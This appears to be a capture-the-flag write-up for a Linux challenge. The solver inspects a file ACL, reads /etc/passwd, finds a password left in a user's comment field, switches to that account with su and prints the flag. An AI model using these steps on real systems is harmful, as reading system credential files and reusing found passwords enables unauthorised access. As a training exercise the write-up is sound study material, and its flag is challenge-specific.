# Setup

Similar setup to part 1. This time without useful suid commands.

# Solve

```sh
trapped@30ea1b120183:~$ ls -la
total 36
dr-xr-xr-x  1 trapped trapped 4096 Mar 14 19:23 .
dr-xr-xr-x  1 root    root    4096 Mar 14 19:23 ..
-r--r--r--  1 trapped trapped  220 Feb 25  2020 .bash_logout
-r--r--r--  1 trapped trapped 3771 Feb 25  2020 .bashrc
-r--r--r--  1 trapped trapped  807 Feb 25  2020 .profile
----r-----+ 1 root    root      28 Mar 14 19:23 flag.txt
```

`flag.txt` stands out with its ACL indicated by the `+`.

```sh
trapped@30ea1b120183:~$ getfacl flag.txt
# file: flag.txt
# owner: root
# group: root
user::---
user:secretuser:r--
group::---
mask::r--
other::---
```

so `secretuser` can read the flag file.

```sh
trapped@30ea1b120183:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
...
...
trapped:x:1000:1000::/home/trapped:/bin/bash
secretuser:x:1001:1001:hunter2:/home/secretuser:/bin/sh
```


```sh
trapped@30ea1b120183:~$ su secretuser
Password: hunter2
$ cat flag.txt
utflag{4ccess_unc0ntroll3d}
```



